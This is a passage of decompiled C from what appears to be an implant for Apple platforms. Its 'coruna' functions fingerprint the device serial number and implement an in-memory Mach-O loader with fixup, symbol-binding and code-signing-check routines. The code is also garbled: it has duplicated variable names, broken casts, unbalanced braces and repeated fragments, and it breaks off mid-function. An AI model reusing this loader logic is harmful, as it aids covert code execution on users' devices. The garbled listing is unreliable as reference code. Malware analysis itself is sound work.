        buf = (void (*)_dlsym(addr,"IORegistryEntryCreateCFProperty");
        str = (void (*)_dlsym(addr,"IOObjectRelease");
        if (((ptr == (void (*)0x0) ||
            (((buf == (void (*)0x0 || (str == (void (*)0x0)) || (ptr == (uint32_t *)0x0)))
            ) || (u = (*ptr)(*ptr,"IODeviceTree:/"), (int)u == 0)) {
          _dlclose(addr);
        }
        else {
          port = *(uint64_t *)k_implant_kcfallocatordefault_slot;
          off = _CFStringCreateWithCString(port,"IOPlatformSerialNumber",0x8000100);
          if (off == 0) {
            err = -1;
          }
          else {
            base = (*buf)(u,off,port,0);
            if (base == 0) {
done:
              err = -1;
            }
            else {
              ctx_val = _CFStringGetTypeID();
              serial = _CFGetTypeID(base);
              if (ctx_val != serial) goto done;
              err = _CFStringGetCString(base,&bootargs,0x40,0x8000100);
              err = -(uint)(err == 0);
              _CFRelease(base);
            }
            _CFRelease(off);
          }
          (*str)(u);
          _dlclose(addr);
          addr = bootargs;
          if (err == 0) {
            version = scratch & 0xff;
            host_info = 0;
            thread_attr = 0;
            action = 0;
            serial_buf = 0;
            scratch = 0;
            bootargs = 0;
            thread_attr = 0;
            bootargs = 0;
            status = false;
            u = 0;
            *(bool *)out_serial = status;
            if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
            return;
            }
            ___stack_chk_fail(u);
          }
        }
      }
      version = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
      if (version == 0) {
        u = 0xfffffffd;
        if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
        return;
        }
        ___stack_chk_fail(u);
      }
      err = *(int *)(version + 0x80);
      if ((err == -0x6d04c838 || err == 0x37a09642) || err == 0x2c91a47e) {
        size = *(uint *)(version + 0x10) >> 0x1a & 1;
      }
      else {
        size = (uint)(*(short *)(version + 0x26) != 0x80);
      }
      status = size == 0;
    }
  }
cleanup:
  u = 0;
  *(bool *)out_serial = status;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
uint64_t coruna_bind_loader_create(uint64_t *val,short *arg,uint64_t id_2,short *arg,uint64_t size_3 ,int flags)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) &&
     ((arg == (short *)0x0 || ((*arg == 1 && (arg[1] != 0)))))) {
    ptr = _calloc(1,0x20);
    if (ptr == (uint64_t *)0x0) {
      u = 0xad009;
    }
    else {
      ptr[1] = arg;
      ptr[2] = arg;
      u = coruna_load_libcache(ptr,arg,id_2,size_3);
      if ((int)u == 0) {
        if ((flags == 0) || (u = coruna_loader_init_shared_cache(ptr), (int)u == 0)) {
          buf = _calloc(1,0x70);
          if (buf != (uint32_t *)0x0) {
            *buf = 0x10003;
            *(uint64_t **)(buf + 2) = ptr;
            *(void (**)(buf + 4) = coruna_ctx_free;
            *(void (**)(buf + 6) = coruna_loader_bind_image;
            *(void (**)(buf + 8) = coruna_loader_teardown;
            *(void (**)(buf + 10) = coruna_loader_csops_check;
            *(void (**)(buf + 0xc) = coruna_loader_mach_send;
            *(void (**)(buf + 0xe) = coruna_realpath_if_mapped;
            *(void (**)(buf + 0x18) = coruna_call_realpath;
            *(void (**)(buf + 0x10) = coruna_call_pid_for_task;
            *(void (**)(buf + 0x12) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x14) = coruna_loader_verify_sig;
            *(void (**)(buf + 0x16) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x1a) = coruna_loader_iface_get;
            *val = buf;
            return 0;
          }
          u = 0xad009;
          if (ptr[3] != 0) {
            coruna_ctx_free();
            ptr[3] = 0;
          }
        }
        coruna_ctx_free(*ptr);
        *ptr = 0;
      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_loader_init_shared_cache(uint64_t *val)
{
  int err;
  uint64_t u;
  long *ptr;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    ptr = val + 3;
    if ((*ptr == 0) && (val[2] != 0)) {
      u = coruna_csops(ptr,val[2],*val,val[1]);
      err = (int)u;
      if ((err != 0) && ((err == 0x7003 || ((val[1] == 0 && (err == 0x1e037)))))) {
        u = 0;
        *ptr = 0;
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t *ptr;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  ptr = (uint64_t *)val[1];
  if (ptr[3] == 0) {
    size = coruna_ctx_free(*ptr);
  }
  else {
    u = coruna_ctx_free();
    size = coruna_ctx_free(*ptr);
    if ((int)u != 0) goto fail;
  }
  u = size;
fail:
  ptr[1] = 0;
  *ptr = 0;
  ptr[3] = 0;
  ptr[2] = 0;
  _free(ptr);
  val[0xb] = 0;
  val[10] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return u;
}





unsigned long coruna_loader_bind_image(long arg,short *val)

{
  uint u;
  unsigned long size;
  uint64_t *copy;
  
  size = 0xad001;
  if ((((arg != 0) && (val != (short *)0x0)) && (*val == 2)) && (1 < (ushort)val[1])
     ) {
    copy = *(uint64_t **)(arg + 8);
    if ((short *)copy[1] == (short *)0x0) {
      size = coruna_loader_set_image(*copy,val);
      if ((int)size == 0) {
        copy[1] = val;
        size = coruna_loader_init_shared_cache(copy);
        if ((int)size != 0) {
          copy[1] = 0;
        }
      }
    }
    else {
      u = 0;
      if ((short *)copy[1] != val) {
        u = 0xad005;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_loader_teardown(long handle)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t *ptr;
  long *ptr;
  
  size = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  ptr = *(uint64_t **)(handle + 8);
  if (ptr[1] == 0) {
    return 0;
  }
  if (ptr[3] == 0) {
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
  }
  else {
    u = coruna_ctx_free();
    ptr[3] = 0;
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
    ptr[1] = 0;
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  return u;
}





uint64_t coruna_loader_csops_check(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_csops(**(uint64_t **)(handle + 8));
    return u;
  }
  return 0xad001;
}





uint64_t
uint64_t coruna_loader_mach_send(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  uint64_t size;
  uint16_t *ptr;
  uint64_t version;
  uint64_t *buf;
  long scratch;
  
  version = 0xad001;
  if ((((arg != 0) && (arg != 0)) && ((int)val != 0)) && (size_3 != (uint64_t *)0x0))
  {
    buf = *(uint64_t **)(arg + 8);
    ptr = _calloc(1,0x40);
    if (ptr == (uint16_t *)0x0) {
      version = 0xad009;
    }
    else {
      *ptr = 1;
      ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_ctx_free;
      ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_lookup_export_call;
      ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_loader_set_image_call;
      scratch = 0;
      version = coruna_lookup_export(*buf,arg,val,id_2,&scratch);
      if ((int)version == 0) {
        u = *(uint64_t *)(scratch + 8);
        size = *(uint64_t *)(scratch + 0x10);
        *(long *)(ptr + 4) = scratch;
        *(uint64_t *)(ptr + 8) = u;
        *(int *)(ptr + 0xc) = (int)size;
        *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(scratch + 0x18);
        *size_3 = ptr;
      }
      else {
        coruna_ctx_free(ptr);
      }
    }
  }
  return version;
}





unsigned long coruna_realpath_if_mapped(long arg,uint64_t val)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,3);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_realpath(long arg,uint64_t val,uint64_t n,uint64_t m)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,n,m);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_pid_for_task(long arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  u = 0xad001;
  if (arg != 0) {
    serial = *(long *)(*(long *)(arg + 8) + 0x18);
    if (serial != 0) {
      size = coruna_pid_for_task(serial);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





uint64_t coruna_call_mach_port_deallocate(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_218cc(handle);
    }
  }
  return u;
}





uint64_t coruna_loader_verify_sig(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_2145c(handle);
    }
  }
  return u;
}





uint64_t coruna_call_mach_port_deallocate(long handle,uint64_t val,uint64_t id_2,long addr_2)
{
  uint64_t u;
  
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) && (addr_2 != 0)) {
    u = coruna_mach_port_deallocate(val,id_2,0,addr_2,0);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_iface_get(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0;
  if (handle != 0) {
    if ((*(long **)(handle + 8) == (long *)0x0) || (handle = **(long **)(handle + 8), handle == 0))
    {
      return 0;
    }
    u = *(uint64_t *)(handle + 8);
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    if (val[1] == 0) {
      u = 0;
    }
    else {
      u = coruna_loader_ctx_destroy();
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





uint64_t coruna_lookup_export_call(long handle,long addr_2,long off_3)
{
  uint64_t u;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != 0)) && (*(long *)(handle + 8) != 0)) {
    u = coruna_lookup_export();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_set_image_call(long handle)
{
  uint64_t u;
  
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    u = coruna_implant08_via_macho_foreach_loadcmd();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_macho_apply_fixups(long handle)
{
  uint *ptr;
  long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long *copy;
  unsigned long *data;
  uint u;
  byte err;
  long handle;
  uint *obj;
  unsigned long *block;
  uint *entry;
  unsigned long size;
  int *err;
  int err;
  uint *entry_9;
  unsigned long version;
  uint port;
  unsigned long tag;
  int *status;
  uint kind;
  uint64_t type_id;
  long addr;
  long off;
  unsigned long type_id_8;
  long base;
  uint *entry_10;
  int *flags;
  long ctx_val;
  long serial;
  long scratch;
  
  if (handle == 0) {
    type_id = 0xad001;
  }
  else {
    ctx_val = *(long *)(handle + 0x120);
    if ((((ctx_val == 0) || (base = *(long *)(handle + 0x1b0), base == 0)) ||
        (entry_10 = *(uint **)(handle + 8), entry_10 == (uint *)0x0)) ||
       ((serial = *(long *)(handle + 0x10), serial == 0 ||
        (addr = *(long *)(handle + 0x170), addr == 0)))) {
      type_id = 0x930009;
    }
    else {
      type_id = 0x930009;
      if (*(long *)(handle + 0x1a8) != 0) {
        off = *(long *)(handle + 0x50);
        port = *(uint *)(base + 0x4c);
        handle = coruna_fixup_slide_base(handle);
        type_id = 0x930008;
        if (handle != 0) {
          if (port != 0) {
            obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x48));
            if (obj < entry_10) {
              return 0x930003;
            }
            ptr = (uint *)(serial + (long)entry_10);
            if (ptr <= obj) {
              return 0x930003;
            }
            entry = obj + (unsigned long)port * 2;
            entry_9 = (uint *)((long)entry - 1);
            if (entry_9 < entry_10) {
              return 0x930003;
            }
            if (ptr <= entry_9) {
              return 0x930003;
            }
            do {
              port = *obj;
              tag = (unsigned long)port;
              if ((int)port < 0) {
                if ((~port & 0x30000000) != 0) {
                  return 0x930002;
                }
                if ((port & 0xf000000) != 0) {
                  return 0x930002;
                }
                tag = tag & 0xffffff;
fail:
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              else if ((obj[1] & 0xffffff) != 0) {
                if ((obj[1] & 0xf6000000) != 0x6000000) {
                  return 0x930002;
                }
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              obj = obj + 2;
            } while (obj < entry);
            ctx_val = *(long *)(handle + 0x120);
            if (ctx_val == 0) {
              return 0x910012;
            }
            entry_10 = *(uint **)(handle + 8);
            if (entry_10 == (uint *)0x0) {
              return 0x910012;
            }
          }
          if (*(long *)(handle + 0x10) == 0) {
            type_id = 0x910012;
          }
          else {
            port = *(uint *)(base + 0x44);
            if (port != 0) {
              obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x40));
              if (obj < entry_10) {
                return 0x91000a;
              }
              ptr = (uint *)(*(long *)(handle + 0x10) + (long)entry_10);
              if (ptr <= obj) {
                return 0x91000a;
              }
              entry = (uint *)((long)obj + (unsigned long)port * 8 + -1);
              if (entry < entry_10) {
                return 0x91000a;
              }
              if (ptr <= entry) {
                return 0x91000a;
              }
              u = *(uint *)(addr + 0x18);
              ctx_val = coruna_fixup_slide_base(handle);
              if (ctx_val == 0) {
                return 0x930008;
              }
              tag = 0;
              scratch = 0;
              block = (unsigned long *)0x0;
              do {
                if ((obj[tag * 2 + 1] & 0xf6000000) != 0x6000000) {
                  return 0x910002;
                }
                buf = (unsigned long *)(ctx_val + (int)obj[tag * 2]);
                data = *(unsigned long **)(handle + 8);
                str = (unsigned long *)(*(long *)(handle + 0x10) + (long)data);
                if (buf < data || str <= buf) {
                  return 0x910002;
                }
                base = *(long *)(handle + 0x1a8);
                version = (unsigned long)obj[tag * 2 + 1] & 0xffffff;
                copy = (unsigned long *)(base + version * 0x10);
                if (copy < data || str <= copy) {
                  return 0x910002;
                }
                size = *buf;
                type_id_8 = size;
                if ((u >> 4 & 1) != 0) {
                  serial = base + version * 0x10;
                  if (((~*(byte *)(serial + 4) & 0xe) == 0) &&
                     ((*(ushort *)(serial + 6) >> 7 & 1) != 0)) {
                    base = base + version * 0x10;
                    version = size - *(long *)(base + 8);
                    type_id_8 = version;
                    if (version != 0) {
                      err = *(int *)(*(long *)(handle + 0x170) + 0x10);
                      if (err == 0) {
done:
                        type_id_8 = 0;
                      }
                      else {
                        err = *(byte *)(base + 5);
                        status = (int *)(*(long *)(handle + 0x148) + 0x20);
                        kind = 1;
                        do {
                          if (*status == 0x19) {
                            if (((kind & 0xff) <= (uint)err) &&
                               ((uint)err < status[0x10] + (kind & 0xff))) {
                              err = (uint)err - (kind & 0xff);
                              if ((size < *(unsigned long *)(status + (long)err * 0x14 + 0x1a)) ||
                                 (type_id_8 = version,
                                 *(long *)(status + (long)err * 0x14 + 0x1c) +
                                 *(unsigned long *)(status + (long)err * 0x14 + 0x1a) <= size))
                              goto done;
                              break;
                            }
                            kind = kind + status[0x10];
                          }
                          status = (int *)((long)status + (unsigned long)(uint)status[1]);
                          err = err + -1;
                          type_id_8 = 0;
                        } while (err != 0);
                      }
                    }
                  }
                  else {
                    type_id_8 = size - *(long *)(serial + 8);
                  }
                }
                if ((copy != block) &&
                   (type_id = coruna_fixup_resolve_sym(handle,copy,&scratch,0), (int)type_id != 0)) {
                  return type_id;
                }
                if (((u >> 4 & 1) == 0) || (*buf != scratch + type_id_8)) {
                  *buf = scratch + type_id_8;
                }
                tag = tag + 1;
                block = copy;
              } while (tag != port);
            }
            if ((((*(long *)(handle + 0x148) == 0) || (*(long *)(handle + 0x120) == 0)) ||
                (*(long *)(handle + 0x1b0) == 0)) ||
               ((*(long *)(handle + 8) == 0 || (*(long *)(handle + 0x10) == 0)))) {
              type_id = 0x910011;
            }
            else {
              type_id = 0x910011;
              if (*(long *)(handle + 0x1a8) != 0) {
                ctx_val = *(long *)(handle + 0x170);
                if (*(int *)(ctx_val + 0x10) == 0) {
                  type_id = 0;
                }
                else {
                  port = 0;
                  base = *(long *)(handle + 0x120) +
                           (unsigned long)*(uint *)(*(long *)(handle + 0x1b0) + 0x38);
                  serial = *(long *)(handle + 8) - *(long *)(handle + 0x168);
                  status = (int *)(*(long *)(handle + 0x148) + 0x20);
                  do {
                    if (*status == 0x19) {
                      flags = status + 0x12;
                      err = flags + (unsigned long)(uint)status[0x10] * 0x14;
                      if (flags < err) {
cleanup:
                        if ((flags[0x10] & 0xfeU) != 6 || *(unsigned long *)(flags + 10) < 8) {
                          type_id = 0;
check_ok:
                          flags = flags + 0x14;
                          if ((err <= flags) || ((int)type_id != 0)) goto skip;
                          goto cleanup;
                        }
                        u = flags[0x11];
                        tag = base + (unsigned long)u * 4;
                        type_id_8 = *(unsigned long *)(handle + 8);
                        version = *(long *)(handle + 0x10) + type_id_8;
                        if ((type_id_8 <= tag && tag < version) &&
                           (size = *(unsigned long *)(flags + 10) >> 3,
                           tag = (base + (size + u) * 4) - 4,
                           type_id_8 <= tag && tag < version)) {
                          tag = 0;
                          ctx_val = *(long *)(flags + 8) + serial;
                          do {
                            kind = *(uint *)(base + (unsigned long)(u + (int)tag) * 4);
                            if (kind == 0x40000000) {
                              type_id = 0;
                            }
                            else if (kind == 0x80000000) {
                              type_id = 0;
                              *(long *)(ctx_val + tag * 8) =
                                   *(long *)(ctx_val + tag * 8) + serial;
                            }
                            else {
                              version = *(long *)(handle + 0x1a8) + (unsigned long)kind * 0x10;
                              if (version < *(unsigned long *)(handle + 8) ||
                                  *(long *)(handle + 0x10) + *(unsigned long *)(handle + 8) <= version) {
                                type_id = 0x910004;
                                goto skip;
                              }
                              scratch = 0;
                              type_id = coruna_fixup_resolve_sym(handle,version,&scratch,1);
                              if ((int)type_id == 0) {
                                *(long *)(ctx_val + tag * 8) = scratch;
                              }
                            }
                            tag = tag + 1;
                          } while (((tag & 0xffffffff) < size) && ((int)type_id == 0));
                          goto check_ok;
                        }
                        type_id = 0x910005;
skip:
                        ctx_val = *(long *)(handle + 0x170);
                      }
                      else {
                        type_id = 0;
                      }
                    }
                    else {
                      type_id = 0;
                    }
                    status = (int *)((long)status + (unsigned long)(uint)status[1]);
                    port = port + 1;
                  } while (port < *(uint *)(ctx_val + 0x10) && (int)type_id == 0);
                }
              }
            }
          }
        }
      }
    }
  }
  return type_id;
}





long coruna_fixup_slide_base(long handle)
{
  long handle;
  int *err;
  int err;
  
  if (handle == 0) {
fail:
    handle = 0;
  }
  else {
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    err = *(int *)(*(long *)(handle + 0x170) + 0x10) + 1;
    do {
      err = err + -1;
      if (err == 0) goto fail;
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        handle = *(long *)(handle + 0x18) + *(long *)(err + 6);
      }
      else {
        handle = 0;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
    } while (handle == 0);
  }
  return handle;
}





unsigned long coruna_fixup_resolve_sym(long arg,uint *val,unsigned long *n,int m)

{
  uint u;
  ushort size;
  unsigned long type_id;
  unsigned long version;
  unsigned long cache_46;
  
  type_id = 0xad001;
  u = 0x910003;
  if (m == 0) {
    u = 0x910001;
  }
  version = (unsigned long)u;
  if (((arg != 0) && (val != (uint *)0x0)) && (n != (unsigned long *)0x0)) {
    if (((~(byte)val[1] & 0xe) == 0) &&
       (size = *(ushort *)((long)val + 6),
       ((byte)val[1] & 0x10) != 0 || (size & 0x80) != 0)) {
      type_id = *(long *)(arg + 8) + *(long *)(val + 2);
      *n = type_id;
      if ((size >> 3 & 1) == 0) {
        type_id = 0;
      }
      else {
        *n = type_id | 1;
        type_id = 0;
      }
    }
    else {
      type_id = version;
      if (*(long *)(arg + 0x1b8) != 0) {
        version = *(long *)(arg + 0x1b8) + (unsigned long)*val;
        if ((*(unsigned long *)(arg + 8) <= version) &&
           (version < *(long *)(arg + 0x10) + *(unsigned long *)(arg + 8))) {
          cache_46 = 0;
          version = coruna_readclass_from_image(arg,0,version,0,0,&cache_46);
          if (((int)version != 0x910006) && (type_id = version, (int)version == 0)) {
            *n = cache_46;
          }
        }
      }
    }
  }
  return type_id;
}





uint64_t coruna_macho_apply_chained_fixups(long handle)
{
  unsigned long *ptr;
  byte *ptr;
  long *buf;
  uint *buf;
  uint *str;
  uint *copy;
  uint *data;
  uint *obj;
  long *str;
  uint *block;
  byte err;
  short ls12;
  uint *entry;
  void (*ptr)(void);
  bool status;
  long *copy;
  uint64_t u;
  void *data;
  uint size;
  uint version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint type_id;
  byte *obj;
  uint64_t type_id_8;
  unsigned long type_id_9;
  int err;
  long addr;
  long off;
  void *block;
  unsigned long type_id_10;
  long base;
  int status;
  byte *entry;
  byte *entry_9;
  unsigned long unaff_x30;
  unsigned long scratch;
  uint *bootargs;
  
  type_id_8 = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  handle = *(long *)(handle + 0x188);
  if (handle != 0) {
    off = *(long *)(handle + 0x120);
    if (off == 0) {
      return 0xad001;
    }
    addr = *(long *)(handle + 0x40);
    base = *(long *)(handle + 0x168);
    size = *(uint *)(handle + 8);
    type_id = *(uint *)(handle + 0xc);
    copy = (long *)coruna_macho_seg19_offset(handle,0,0);
    if (copy == (long *)0x0) {
      return 0x930004;
    }
    if (type_id == 0) {
fail:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
        ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
        return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
        return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    addr = addr - base;
    entry_9 = (byte *)(off + (unsigned long)size);
    ptr = entry_9 + type_id;
    type_id_9 = 1;
code_r0x00012238:
    entry = entry_9 + 1;
    err = *entry_9 >> 4;
    if (8 < err) {
      return 0x930005;
    }
    port = (unsigned long)*entry_9 & 0xf;
    status = (int)type_id_9;
    err = (int)addr;
    type_id_10 = port;
    entry_9 = entry;
    switch(err) {
    default:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
      ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
      return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
      return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    type_id_9 = type_id_10;
    ptr = coruna_fixup_bind_entry;
    if (*(char *)(handle + 0x138) != '\0') {
    ptr = coruna_fixup_bind_lazy;
    }
    type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
    if ((int)type_id_8 != 0) {
    return type_id_8;
    }
    if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
    return 0;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
    }
    type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
    return type_id_8;
  }
  if (*(long *)(handle + 0x198) == 0) {
    return 0x910010;
  }
  bootargs = (uint *)0x0;
  u = coruna_block_dispose(handle,*(uint32_t *)(*(long *)(handle + 0x198) + 8),&bootargs);
  entry = bootargs;
  if ((int)u != 0) {
    return u;
  }
  block = *(uint **)(handle + 8);
  buf = (uint *)(*(long *)(handle + 0x10) + (long)block);
  if (buf < block) {
    return 0x920006;
  }
  if (bootargs < block) {
    return 0x920006;
  }
  if (buf <= bootargs) {
    return 0x920006;
  }
  size = *(uint *)(*(long *)(handle + 0x198) + 0xc);
  str = (uint *)((unsigned long)size + (long)bootargs);
  if ((str < bootargs || str < block) || buf < str) {
    return 0x920006;
  }
  if (((*bootargs == 0) && (0x1b < bootargs[1])) && (bootargs[1] < size)) {
    type_id = bootargs[4];
    type_id_9 = (unsigned long)type_id;
    if (type_id == 0) {
      if (bootargs[6] != 0) {
        return 0x920003;
      }
      type_id_9 = 0;
      data = (void *)0x0;
joined_r0x00012894:
      bootargs = entry;
      if ((entry != (uint *)0x0) && (size != 0)) {
        buf = (uint *)((long)entry + (unsigned long)entry[1]);
        type_id = *buf;
        if (type_id == 0) {
          type_id_8 = 0;
        }
        else {
          scratch = 0;
          block = (uint *)((long)entry + (unsigned long)size);
          do {
            if (buf[scratch + 1] != 0) {
              type_id_8 = 0x920006;
              if ((block < entry) ||
                 (str = (uint *)((long)buf + (unsigned long)buf[scratch + 1]),
                 (((str < entry || block <= str) || (uint *)0xffffffffffffffe7 < str)
                 || str + 6 < entry) || block < str + 6)) break;
              copy = (uint *)((unsigned long)*str + (long)str);
              if ((copy < str || copy < entry) || block < copy) {
done:
                type_id_8 = 0x920006;
                break;
              }
              port = 0;
              while (port < (ushort)str[5]) {
                copy = (uint *)((long)str + port * 2 + 0x16);
                data = (uint *)((unsigned long)*str + (long)str);
                if (((((data < str || copy < str) || data <= copy) ||
                     (uint *)0xfffffffffffffffc < copy) &&
                     (((data < str || copy < str) || data <= copy) ||
                     copy != (uint *)0xfffffffffffffffd) || (uint *)((long)copy + 2U) < str)
                    type_id_8 = 0x920006;
                    break;
                ls12 = (short)*copy;
                if (ls12 == -1) {
                  type_id_8 = 0;
                }
                else if (ls12 < 0) {
                  obj = (uint *)((long)str + ((long)ls12 & 0x7fffU) * 2 + 0x16);
                  copy = (uint *)((long)obj + 2);
                  if ((((obj < str || data <= obj) || (uint *)0xfffffffffffffffd < obj
                       type_id_8 = 0x920006;
                       break;
                  while( true ) {
                    size = *obj;
                    type_id_8 = coruna_bind_interpret(handle,data,(uint)type_id_9 & 0xffff,str,port,
                                          (ushort)size & 0x7fff);
                    if (((int)type_id_8 != 0) || ((short)(ushort)size < 0)) break;
                    data = (uint *)((unsigned long)*str + (long)str);
                    type_id_8 = 0x920006;
                    break;
                  }
                }
                else {
                  type_id_8 = coruna_bind_interpret(handle,data,(uint)type_id_9 & 0xffff,str,port,ls12);
                }
                port = port + 1;
                if (data == (void *)0x0) {
                return type_id_8;
                }
                if ((type_id_9 & 0xffff) == 0) {
                return type_id_8;
                }
                type_id_9 = type_id_9 & 0xffff;
                u = type_id_8;
                }
                else {
                if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
                u = 0x920003;
                }
                return u;
                code_r0x00012588:
                type_id_9 = type_id_10;
                ptr = coruna_fixup_bind_entry;
                if (*(char *)(handle + 0x138) != '\0') {
                ptr = coruna_fixup_bind_lazy;
                }
                type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
                if ((int)type_id_8 != 0) {
                return type_id_8;
              }
              type_id = *buf;
            }
            type_id_8 = 0;
            scratch = scratch + 1;
          } while (scratch < type_id);
        }
      }
cleanup:
      if (data == (void *)0x0) {
        return type_id_8;
      }
      if ((type_id_9 & 0xffff) == 0) {
        return type_id_8;
      }
      type_id_9 = type_id_9 & 0xffff;
      u = type_id_8;
    }
    else {
      if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
         u = 0x920003;
         }
         return u;
         code_r0x00012588:
         type_id_9 = type_id_10;
         ptr = coruna_fixup_bind_entry;
         if (*(char *)(handle + 0x138) != '\0') {
         ptr = coruna_fixup_bind_lazy;
         }
         type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
         if ((int)type_id_8 != 0) {
         return type_id_8;
    }
skip:
    _bzero(data,type_id_9 << 3);
    _free(data);
  }
  else {
check_ok:
    u = 0x920003;
  }
  return u;
code_r0x00012588:
  type_id_9 = type_id_10;
  ptr = coruna_fixup_bind_entry;
  if (*(char *)(handle + 0x138) != '\0') {
